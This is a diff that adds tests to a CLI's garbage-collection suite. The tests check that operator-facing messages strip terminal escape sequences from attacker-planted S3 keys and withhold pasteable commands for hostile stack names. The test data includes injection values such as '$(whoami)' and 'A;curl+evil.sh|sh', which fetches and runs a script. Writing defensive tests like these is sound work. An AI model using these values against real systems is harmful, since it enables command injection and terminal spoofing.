@@ -602,6 +602,124 @@ describe('cdkd gc', () => {
       expect(message).not.toMatch(/cdkd \(demo-app-1\)/);
       expectNothingDeleted();
     });
+
+    // Issue go-to-k/cdkd#3179 section C. This listing is what an operator reads
+    // while deciding whether a lock is stale, and BOTH halves of each row come
+    // off an S3 key nobody validated: the rendered `stack (region)` and the raw
+    // key in brackets beside it. Guarding one and not the other is inert — the
+    // same planted escape reaches the same terminal line either way.
+    it('sanitises BOTH the descriptor and the bracketed key in the lock listing', async () => {
+      const ESC = String.fromCharCode(27);
+      const CR = String.fromCharCode(13);
+      const planted = `cdkd/Prod${ESC}[2K${CR}Safe/${REGION}/lock.json`;
+      stateBackendMocks.listRawKeys.mockImplementation(async (prefix: string) => {
+        if (prefix === '') return [MARKER_KEY, STATE_KEY, planted];
+        return [];
+      });
+
+      let message = '';
+      try {
+        await runGc(['--yes']);
+      } catch (error) {
+        message = (error as Error).message;
+      }
+
+      expect(message, 'precondition: the lock guard fired').toMatch(/hold an active lock/);
+      // Pin the planted ROW verbatim, which is three properties at once and is
+      // what the first revision of this case got wrong twice over. It asserted
+      // `not.toMatch(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/)` over the WHOLE
+      // message: that class excludes `\x0d`, so the CARRIAGE RETURN its own
+      // comment named was never watched (only the ESC kept it alive), and
+      // being message-wide it could not see WHICH row carried a survivor.
+      // It also pinned no BOUNDARY, so swapping `displayIdent` for
+      // `displaySafe` — sanitised but unquoted, the state section A of the
+      // issue is about — kept it green.
+      const row = message.split('\n').find((l) => l.includes('Prod'));
+      expect(row, 'the planted row is missing from the refusal entirely').toBeDefined();
+      expect(row).toBe(
+        '  - "Prod [2K Safe" (us-east-1)  ["cdkd/Prod [2K Safe/us-east-1/lock.json"]'
+      );
+      expectNothingDeleted();
+    });
+  });
+
+  // Issue go-to-k/cdkd#3179 section C, and the reason these live HERE rather
+  // than beside `isPasteableIdent`: the unit suite for that helper exercises a
+  // hand-written copy of this call site's logic, so it cannot see the wiring.
+  // `const pasteable = true;` at the production site passes that suite in full.
+  // These cases go through `runGc`.
+  describe('the corrupt-state hint never pastes an attacker-chosen name', () => {
+    const corruptBody = 'not json at all';
+
+    async function messageFor(stackSegment: string, layout: 'regional' | 'legacy' = 'regional') {
+      // `legacy` is the region-less `{prefix}/{stack}/state.json` shape, which
+      // takes the OTHER arm of the hint (`cdkd state show <stack>`, no
+      // `--stack-region`). Without it that arm is exercised only by this
+      // file's hand-written copy of the logic, never through `runGc`.
+      const key =
+        layout === 'legacy'
+          ? `cdkd/${stackSegment}/state.json`
+          : `cdkd/${stackSegment}/${REGION}/state.json`;
+      stateBackendMocks.listRawKeys.mockImplementation(async (prefix: string) => {
+        if (prefix === '') return [MARKER_KEY, key];
+        return [];
+      });
+      stateBackendMocks.getRawObject.mockImplementation(async (k: string) => {
+        if (k === MARKER_KEY) return MARKER_BODY;
+        if (k === key) return corruptBody;
+        // `null`, not a body: that is what the real backend answers for a key
+        // it does not hold, and `gc.ts` branches on it.
+        return null;
+      });
+      try {
+        await runGc(['--yes']);
+      } catch (error) {
+        return (error as Error).message;
+      }
+      return '';
+    }
+
+    for (const [label, segment] of [
+      ['command substitution', '$(whoami)'],
+      ['shell metacharacters', 'A;curl+evil.sh|sh'],
+      ['a leading flag', '--state-bucket=attacker'],
+      ['a leading tilde', '~root'],
+    ] as const) {
+      it(`withholds the command for ${label}`, async () => {
+        const message = await messageFor(segment);
+        expect(message, 'precondition: the corrupt-state abort fired').toMatch(/not valid JSON/);
+        expect(
+          message,
+          'a command carrying the planted segment was handed to the operator'
+        ).not.toMatch(/cdkd state show/);
+        expect(message).toMatch(/not safe to paste/);
+      });
+    }
+
+    it('still offers the command for an ordinary stack name', async () => {
+      // The control. Without it every assertion above is satisfied by a site
+      // that never offers a command at all.
+      const message = await messageFor('MyStack');
+      expect(message).toMatch(/cdkd state show MyStack --stack-region /);
+      expect(message).not.toMatch(/not safe to paste/);
+    });
+
+    it('takes the region-less arm for a legacy key, both polarities', async () => {
+      const ok = await messageFor('MyStack', 'legacy');
+      expect(ok).toContain('cdkd state show MyStack');
+      expect(ok, 'a legacy key carries no region to name').not.toMatch(/--stack-region/);
+      const hostile = await messageFor('$(whoami)', 'legacy');
+      expect(hostile).not.toMatch(/cdkd state show/);
+      expect(hostile).toMatch(/not safe to paste/);
+    });
+
+    it('sanitises the KEY it names when no command can be offered', async () => {
+      // `gc.ts` renders the key through `displayIdent` in this message too.
+      // Every other case here plants a control-free segment, so that call was
+      // unwatched: interpolating the key raw kept them all green.
+      const message = await messageFor(`Prod${String.fromCharCode(27)}[2K${String.fromCharCode(13)}Safe`);
+      expect(message).toContain('State file "cdkd/Prod [2K Safe/us-east-1/state.json"');
+    });
   });
 
   it('--dry-run prints the plan and performs zero mutations without prompting', async () => {
